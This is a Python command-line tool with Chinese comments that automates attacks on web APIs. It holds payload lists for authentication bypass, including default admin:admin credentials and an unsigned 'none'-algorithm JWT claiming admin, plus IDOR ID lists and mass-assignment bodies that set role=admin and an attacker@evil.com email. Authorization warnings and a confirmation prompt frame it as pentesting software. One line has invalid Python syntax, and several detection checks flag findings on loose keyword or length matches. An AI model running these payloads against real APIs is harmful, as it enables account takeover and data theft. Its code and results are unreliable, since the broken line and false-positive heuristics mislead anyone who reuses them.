#!/usr/bin/env python3
"""
Purpose: API 安全自动化测试工具
         支持：认证绕过、IDOR、速率限制测试、批量赋值、越权访问
Auth: 仅限授权使用 — 未经书面授权禁止对任何目标执行检测
Dependencies: requests, colorama, concurrent.futures
Usage:
    python api_security.py -u "https://api.example.com/v1" --auth-test
    python api_security.py -u "https://api.example.com/v1" --idor-test --id-param user_id
"""

import argparse
import concurrent.futures
import logging
import re
import sys
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse

import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class VulnerabilityType(Enum):
    """漏洞类型"""
    AUTH_BYPASS = "auth_bypass"           # 认证绕过
    IDOR = "idor"                         # 不安全的直接对象引用
    RATE_LIMIT_BYPASS = "rate_limit_bypass"  # 速率限制绕过
    MASS_ASSIGNMENT = "mass_assignment"   # 批量赋值
    PRIVILEGE_ESCALATION = "privilege_escalation"  # 权限提升
    BROKEN_ACCESS_CONTROL = "broken_access_control"  # 访问控制失效
    INFORMATION_LEAK = "information_leak"  # 信息泄露


@dataclass
class APIVulnerability:
    """API 漏洞发现"""
    url: str
    vuln_type: VulnerabilityType
    endpoint: str
    method: str
    payload: Dict
    response: str
    evidence: str
    severity: str = "medium"
    user_id: Optional[str] = None


@dataclass
class TestConfig:
    """测试配置"""
    base_url: str
    timeout: int = 10
    delay: float = 0.5
    verify_ssl: bool = False
    proxy: Optional[str] = None
    user_agent: str = "APISecurityTester/1.0"
    max_workers: int = 5

    # 测试参数
    test_auth: bool = False
    test_idor: bool = False
    test_rate_limit: bool = False
    test_mass_assignment: bool = False
    test_privilege_escalation: bool = False

    # 用户凭证
    valid_token: Optional[str] = None
    user1_creds: Optional[Dict[str, str]] = None  # 普通用户
    user2_creds: Optional[Dict[str, str]] = None  # 另一个用户（用于 IDOR）
    admin_creds: Optional[Dict[str, str]] = None   # 管理员

    # 测试目标
    id_param: Optional[str] = None  # IDOR 测试的参数名（如 user_id）
    rate_limit_endpoint: Optional[str] = None  # 速率限制测试端点


# ============================================================
# Payload 数据库
# ============================================================

# 认证绕过 payload
AUTH_BYPASS_PAYLOADS = [
    # 空认证
    {"Authorization": ""},
    {"token": ""},
    {"api_key": ""},

    # 特殊值
    {"Authorization": "null"},
    {"Authorization": "None"},
    {"Authorization": "undefined"},
    {"Authorization": "bypass"},
    {"Authorization": "admin"},

    # 已知默认凭据
    {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
    {"Authorization": "Basic dGVzdDp0ZXN0="},   # test:test
    {"api_key": "12345"},
    {"api_key": "admin123"},

    # 弱加密
    {"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."},  # none 算法
    {"token": "admin"},

    # HTTP 方法绕过
    {"X-Original-Method": "GET"},
    {"X-HTTP-Method-Override": "GET"},
]

# IDOR 测试 payload
IDOR_TEST_IDS = [
    # 常见 ID
    "1",
    "2",
    "0",
    "-1",
    "999999",

    # 字符串 ID
    "admin",
    "administrator",
    "root",
    "test",
    "demo",

    # UUID
    "00000000-0000-0000-0000-000000000000",
    "ffffffff-ffff-ffff-ffff-ffffffffffff",

    # 编码 ID
    "%31",
    "%41",
    "0x1",
    "base64:MQ==",
]

# 批量赋值 payload
MASS_ASSIGNMENT_PAYLOADS = {
    "user_create": {
        "role": "admin",
        "is_admin": True,
        "permissions": ["all"],
        "email": "attacker@evil.com",
        "password": "hacked123",
        "status": "active",
    },
    "user_update": {
        "role": "admin",
        "is_admin": True,
        "email": "attacker@evil.com",
    },
    "order_update": {
        "status": "paid",
        "amount": 0.01,
        "items": [],
    },
}

# 权限提升 payload
PRIVILEGE_ESCALATION_PAYLOADS = [
    {"role": "admin"},
    {"is_admin": True},
    {"permissions": ["admin", "superuser", "root"]},
    {"level": "superuser"},
    {"group": "administrators"},
]


class APISecurityTester:
    """API 安全测试器核心类"""

    def __init__(self, config: TestConfig):
        self.config = config
        self.session = requests.Session()
        self.vulnerabilities: List[APIVulnerability] = []
        self._setup_session()

    def _setup_session(self):
        """配置 HTTP 会话"""
        self.session.verify = self.config.verify_ssl
        self.session.headers.update({"User-Agent": self.config.user_agent})
        if self.config.valid_token:
            self.session.headers.update({"Authorization": f"Bearer {self.config.valid_token}"})
        if self.config.proxy:
            self.session.proxies = {"http": self.config.proxy, "https": self.config.proxy}

    def run_all_tests(self) -> List[APIVulnerability]:
        """运行所有配置的测试"""
        logging.info(f"[*] 开始 API 安全测试: {self.config.base_url}")

        if self.config.test_auth:
            self._test_auth_bypass()

        if self.config.test_idor and self.config.id_param:
            self._test_idor()

        if self.config.test_rate_limit:
            self._test_rate_limit()

        if self.config.test_mass_assignment:
            self._test_mass_assignment()

        if self.config.test_privilege_escalation:
            self._test_privilege_escalation()

        # 通用信息泄露检测
        self._test_information_leak()

        logging.info(f"[*] 测试完成，发现 {len(self.vulnerabilities)} 个漏洞")
        return self.vulnerabilities

    def _test_auth_bypass(self):
        """测试认证绕过"""
        logging.info("[*] 测试认证绕过...")

        # 发现需要认证的端点
        endpoints = self._discover_endpoints()
        if not endpoints:
            logging.warning("[-] 未发现可测试端点")
            return

        for endpoint, method in endpoints:
            url = urljoin(self.config.base_url, endpoint)

            # 测试各种绕过 payload
            for payload in AUTH_BYPASS_PAYLOADS:
                # 先不带认证请求，获取响应
                no_auth_resp = self._send_request(url, method, {})

                # 带 payload 请求
                payload_resp = self._send_request(url, method, {}, headers=payload)

                if no_auth_resp and payload_resp:
                    # 比较响应差异
                    if self._has_auth_bypass(no_auth_resp, payload_resp):
                        logging.info(f"[+] 认证绕过发现! {method} {url}")
                        self.vulnerabilities.append(APIVulnerability(
                            url=url,
                            vuln_type=VulnerabilityType.AUTH_BYPASS,
                            endpoint=endpoint,
                            method=method,
                            payload=payload,
                            response=payload_resp.text[:200],
                            evidence="Response similar to authenticated access",
                            severity="high",
                        ))

                time.sleep(self.config.delay)

    def _test_idor(self):
        """测试 IDOR（不安全的直接对象引用）"""
        if not self.config.user1_creds or not self.config.user2_creds:
            logging.warning("[-] IDOR 测试需要两个用户凭证，跳过")
            return

        logging.info("[*] 测试 IDOR...")

        # User 1 访问自己的资源
        user1_session = self._create_session(self.config.user1_creds)
        user1_resources = self._get_user_resources(user1_session)

        # User 2 尝试访问 User 1 的资源
        user2_session = self._create_session(self.config.user2_creds)

        for resource_url, resource_id in user1_resources:
            user2_resp = user2_session.get(
                resource_url,
                timeout=self.config.timeout,
                verify=self.config.verify_ssl,
            )

            if user2_resp.status_code == 200:
                logging.info(f"[+] IDOR 漏洞发现! User 2 访问 User 1 的资源: {resource_url}")
                self.vulnerabilities.append(APIVulnerability(
                    url=resource_url,
                    vuln_type=VulnerabilityType.IDOR,
                    endpoint=resource_url.replace(self.config.base_url, ""),
                    method="GET",
                    payload={self.config.id_param: resource_id},
                    response=user2_resp.text[:200],
                    evidence=f"User 2 can access User 1's resource (ID: {resource_id})",
                    severity="high",
                    user_id="user2",
                ))

    def _test_rate_limit(self):
        """测试速率限制绕过"""
        logging.info("[*] 测试速率限制...")

        endpoint = self.config.rate_limit_endpoint or "/api/v1/users"
        url = urljoin(self.config.base_url, endpoint)

        # 快速发送请求
        success_count = 0
        rate_limited = False

        for i in range(50):
            resp = self._send_request(url, "GET", {})
            if resp:
                if resp.status_code == 429:  # Too Many Requests
                    rate_limited = True
                    break
                elif resp.status_code == 200:
                    success_count += 1
            time.sleep(0.1)  # 10 req/s

        if success_count > 20:  # 假设合理速率限制是 20 req/min
            logging.warning(f"[+] 速率限制可能失效! {success_count} 个成功请求")
            self.vulnerabilities.append(APIVulnerability(
                url=url,
                vuln_type=VulnerabilityType.RATE_LIMIT_BYPASS,
                endpoint=endpoint,
                method="GET",
                payload={"count": success_count},
                response="",
                evidence=f"Sent {success_count}+ successful requests without rate limit",
                severity="medium",
            ))

    def _test_mass_assignment(self):
        """测试批量赋值漏洞"""
        logging.info("[*] 测试批量赋置...")

        endpoints_to_test = [
            ("/api/v1/users", "POST"),
            ("/api/v1/users/me", "PUT"),
            ("/api/v1/profile", "PUT"),
        ]

        for endpoint, method in endpoints_to_test:
            url = urljoin(self.config.base_url, endpoint)

            # 尝试注入管理员字段
            payload = MASS_ASSIGNMENT_PAYLOADS.get("user_create", {})
            if method == "PUT":
                payload = MASS_ASSIGNMENT_PAYLOADS.get("user_update", {})

            resp = self._send_request(url, method, payload)

            if resp and resp.status_code in (200, 201):
                # 检查响应是否包含注入的字段
                if self._check_mass_assignment_success(resp.text, payload):
                    logging.info(f"[+] 批量赋值漏洞发现! {method} {url}")
                    self.vulnerabilities.append(APIVulnerability(
                        url=url,
                        vuln_type=VulnerabilityType.MASS_ASSIGNMENT,
                        endpoint=endpoint,
                        method=method,
                        payload=payload,
                        response=resp.text[:200],
                        evidence="Server accepted restricted fields (role/is_admin/permissions)",
                        severity="high",
                    ))

            time.sleep(self.config.delay)

    def _test_privilege_escalation(self):
        """测试权限提升"""
        if not self.config.user1_creds:
            logging.warning("[-] 权限提升测试需要用户凭证，跳过")
            return

        logging.info("[*] 测试权限提升...")

        user_session = self._create_session(self.config.user1_creds)
        update_url = urljoin(self.config.base_url, "/api/v1/users/me")

        for payload in PRIVILEGE_ESCALATION_PAYLOADS:
            resp = user_session.put(update_url, json=payload, timeout=self.config.timeout)

            if resp and resp.status_code in (200, 201, 204):
                # 验证权限是否真的提升了
                verify_resp = user_session.get(urljoin(self.config.base_url, "/api/v1/users/me"))
                if verify_resp and verify_resp.status_code == 200:
                    if self._has_privilege_escalated(verify_resp.text):
                        logging.info(f"[+] 权限提升漏洞发现! payload: {payload}")
                        self.vulnerabilities.append(APIVulnerability(
                            url=update_url,
                            vuln_type=VulnerabilityType.PRIVILEGE_ESCALATION,
                            endpoint="/api/v1/users/me",
                            method="PUT",
                            payload=payload,
                            response=verify_resp.text[:200],
                            evidence="User privileges successfully elevated via API",
                            severity="critical",
                        ))
                        break  # 找到一个就够了

            time.sleep(self.config.delay)

    def _test_information_leak(self):
        """测试信息泄露"""
        logging.info("[*] 测试信息泄露...")

        # 测试常见端点
        leak_endpoints = [
            "/api/v1/",
            "/api/v1/users",
            "/api/v1/config",
            "/api/v1/docs",
            "/api/v1/swagger.json",
            "/api/v1/openapi.json",
            "/.well-known/",
        ]

        for endpoint in leak_endpoints:
            url = urljoin(self.config.base_url, endpoint)
            resp = self._send_request(url, "GET", {})

            if resp and resp.status_code == 200:
                leak = self._detect_information_leak(resp.text)
                if leak:
                    logging.info(f"[+] 信息泄露发现! {url}")
                    self.vulnerabilities.append(APIVulnerability(
                        url=url,
                        vuln_type=VulnerabilityType.INFORMATION_LEAK,
                        endpoint=endpoint,
                        method="GET",
                        payload={},
                        response=resp.text[:200],
                        evidence=leak,
                        severity="low",
                    ))

            time.sleep(self.config.delay)

    # ----------------------------------------------------------
    # 辅助方法
    # ----------------------------------------------------------

    def _discover_endpoints(self) -> List[Tuple[str, str]]:
        """发现 API 端点"""
        # 常见 REST API 端点
        common_endpoints = [
            ("/api/v1/users", "GET"),
            ("/api/v1/users", "POST"),
            ("/api/v1/users/me", "GET"),
            ("/api/v1/orders", "GET"),
            ("/api/v1/products", "GET"),
            ("/api/v1/admin", "GET"),
            ("/api/v1/config", "GET"),
        ]
        return common_endpoints

    def _send_request(self, url: str, method: str, data: Dict, headers: Optional[Dict] = None) -> Optional[requests.Response]:
        """发送 HTTP 请求"""
        time.sleep(self.config.delay)
        try:
            if method.upper() == "GET":
                return self.session.get(url, params=data, headers=headers, timeout=self.config.timeout)
            elif method.upper() == "POST":
                return self.session.post(url, json=data, headers=headers, timeout=self.config.timeout)
            elif method.upper() == "PUT":
                return self.session.put(url, json=data, headers=headers, timeout=self.config.timeout)
            elif method.upper() == "DELETE":
                return self.session.delete(url, json=data, headers=headers, timeout=self.config.timeout)
            else:
                return self.session.request(method, url, json=data, headers=headers, timeout=self.config.timeout)
        except requests.RequestException as e:
            logging.debug(f"Request failed: {e}")
            return None

    def _create_session(self, creds: Dict[str, str]) -> requests.Session:
        """创建带认证的 session"""
        session = requests.Session()
        session.verify = self.config.verify_ssl
        if "username" in creds and "password" in creds:
            # 登录获取 token
            login_url = urljoin(self.config.base_url, "/api/v1/auth/login")
            resp = session.post(login_url, json=creds, timeout=self.config.timeout)
            if resp and resp.status_code == 200:
                token = resp.json().get("token") or resp.json().get("access_token")
                if token:
                    session.headers.update({"Authorization": f"Bearer {token}"})
        elif "token" in creds:
            session.headers.update({"Authorization": f"Bearer {creds['token']}"})
        return session

    def _get_user_resources(self, session: requests.Session) -> List[Tuple[str, str]]:
        """获取用户可访问的资源列表"""
        resources = []

        # 尝试获取用户列表
        users_url = urljoin(self.config.base_url, "/api/v1/users")
        resp = session.get(users_url, timeout=self.config.timeout)
        if resp and resp.status_code == 200:
            data = resp.json()
            users = data if isinstance(data, list) else data.get("users", [])
            for user in users[:10]:  # 只取前 10 个
                user_id = user.get("id") or user.get("user_id") or user.get("_id")
                if user_id:
                    user_url = f"{users_url}/{user_id}"
                    resources.append((user_url, str(user_id)))

        return resources

    def _has_auth_bypass(self, no_auth: requests.Response, with_payload: requests.Response) -> bool:
        """判断是否认证绕过"""
        # 如果无认证返回 401，但带 payload 返回 200，说明绕过
        if no_auth.status_code == 401 and with_payload.status_code == 200:
            return True
        # 如果响应长度相似且都有数据，可能绕过
        if abs(len(no_auth.text) - len(with_payload.text)) < 100:
            if len(no_auth.text) > 100:  # 排除空响应
                return True
        return False

    def _check_mass_assignment_success(self, response_text: str, payload: Dict) -> bool:
        """检查批量赋值是否成功"""
        resp_lower = response_text.lower()

        # 检查响应中是否包含我们注入的字段
        if payload.get("role") == "admin":
            if "admin" in resp_lower or '"role":"admin"' in resp_lower:
                return True
        if payload.get("is_admin") is True:
            if '"is_admin":true' in resp_lower or "is_admin":true in resp_lower:
                return True
        if payload.get("permissions"):
            if "all" in resp_lower or "admin" in resp_lower:
                return True

        return False

    def _has_privilege_escalated(self, response_text: str) -> bool:
        """检查权限是否提升"""
        resp_lower = response_text.lower()
        return any(
            kw in resp_lower
            for kw in ["admin", "superuser", "root", "permissions", "role"]
        )

    def _detect_information_leak(self, text: str) -> Optional[str]:
        """检测信息泄露"""
        sensitive_patterns = {
            "email": r'[\w\.-]+@[\w\.-]+\.\w+',
            "ip": r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}',
            "api_key": r'api[_-]?key["\s:]+[\w\-]+',
            "token": r'token["\s:]+[\w\-\.]+',
            "password": r'password["\s:]+["\w\-]+',
            "secret": r'secret["\s:]+["\w\-]+',
            "database": r'database["\s:]+["\w\-]+',
            "version": r'(?i)version["\s:]+[\d\.]+',
        }

        for name, pattern in sensitive_patterns.items():
            if re.search(pattern, text, re.IGNORECASE):
                return f"Potential {name} leak detected"

        return None

    def print_results(self):
        """格式化输出检测结果"""
        if not self.vulnerabilities:
            print("\n[-] 未发现 API 漏洞")
            return

        print(f"\n{'='*60}")
        print("  API 安全测试报告")
        print(f"{'='*60}")
        for i, v in enumerate(self.vulnerabilities, 1):
            print(f"\n  [{i}] {v.vuln_type.value.upper()}")
            print(f"  端点: {v.endpoint}")
            print(f"  方法: {v.method}")
            print(f"  Payload: {v.payload}")
            print(f"  证据: {v.evidence}")
            print(f"  严重程度: {v.severity.upper()}")
            print(f"  URL: {v.url}")
            if v.user_id:
                print(f"  测试用户: {v.user_id}")
        print(f"\n{'='*60}")

    def export_json(self, filepath: str):
        """导出 JSON 格式报告"""
        import json
        data = {
            "vulnerabilities": [
                {
                    "type": v.vuln_type.value,
                    "endpoint": v.endpoint,
                    "method": v.method,
                    "payload": v.payload,
                    "evidence": v.evidence,
                    "severity": v.severity,
                    "url": v.url,
                    "user_id": v.user_id,
                }
                for v in self.vulnerabilities
            ]
        }
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        logging.info(f"[+] JSON 报告已导出: {filepath}")


def main():
    parser = argparse.ArgumentParser(
        description="API 安全自动化测试工具（仅限授权使用）",
        epilog="⚠️  未经授权使用本工具属于违法行为"
    )
    parser.add_argument("-u", "--url", required=True, help="目标 API 基础 URL")
    parser.add_argument("--auth-test", action="store_true", help="测试认证绕过")
    parser.add_argument("--idor-test", action="store_true", help="测试 IDOR")
    parser.add_argument("--id-param", help="IDOR 测试的 ID 参数名")
    parser.add_argument("--rate-limit-test", action="store_true", help="测试速率限制")
    parser.add_argument("--mass-assignment-test", action="store_true", help="测试批量赋值")
    parser.add_argument("--privilege-test", action="store_true", help="测试权限提升")
    parser.add_argument("--valid-token", help="有效的认证 token")
    parser.add_argument("--user1", help="User 1 凭证 (JSON 格式: '{\"username\":\"u1\",\"password\":\"p1\"}')")
    parser.add_argument("--user2", help="User 2 凭证 (JSON 格式)")
    parser.add_argument("--admin", help="管理员凭证 (JSON 格式)")
    parser.add_argument("-o", "--output", help="输出 JSON 报告路径")

    args = parser.parse_args()

    print("⚠️  请确认你已获得目标 API 的测试授权")
    confirm = input("确认已获授权？(y/N): ")
    if confirm.lower() != "y":
        sys.exit(0)

    import json
    config = TestConfig(
        base_url=args.url,
        test_auth=args.auth_test,
        test_idor=args.idor_test,
        id_param=args.id_param,
        test_rate_limit=args.rate_limit_test,
        test_mass_assignment=args.mass_assignment_test,
        test_privilege_escalation=args.privilege_test,
        valid_token=args.valid_token,
        user1_creds=json.loads(args.user1) if args.user1 else None,
        user2_creds=json.loads(args.user2) if args.user2 else None,
        admin_creds=json.loads(args.admin) if args.admin else None,
    )

    tester = APISecurityTester(config)
    results = tester.run_all_tests()
    tester.print_results()

    if args.output:
        tester.export_json(args.output)


if __name__ == "__main__":
    main()
